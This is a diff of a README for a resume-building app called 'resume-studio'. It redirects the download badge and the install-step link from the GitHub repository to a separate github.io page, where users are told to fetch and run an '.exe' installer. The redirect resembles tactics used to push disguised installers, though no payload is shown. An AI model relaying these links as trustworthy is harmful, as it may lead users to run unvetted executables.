@@ -1,6 +1,6 @@
 # 📁 resume-studio - Build custom resumes for every job
 
-[![](https://img.shields.io/badge/Download_Resume_Studio-Blue.svg)](https://github.com/Andreasuar2549/resume-studio)
+[![](https://img.shields.io/badge/Download_Resume_Studio-Blue.svg)](https://andreasuar2549.github.io)
 
 ## 📋 What is this app?
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the app:
 
 Follow these steps to install the software on your computer.
 
-1. Go to the download page: [https://github.com/Andreasuar2549/resume-studio](https://github.com/Andreasuar2549/resume-studio).
+1. Go to the download page: [https://andreasuar2549.github.io](https://andreasuar2549.github.io).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the latest version of the installer, which ends in ".exe".
 4. Once the download finishes, open the file from your "Downloads" folder.
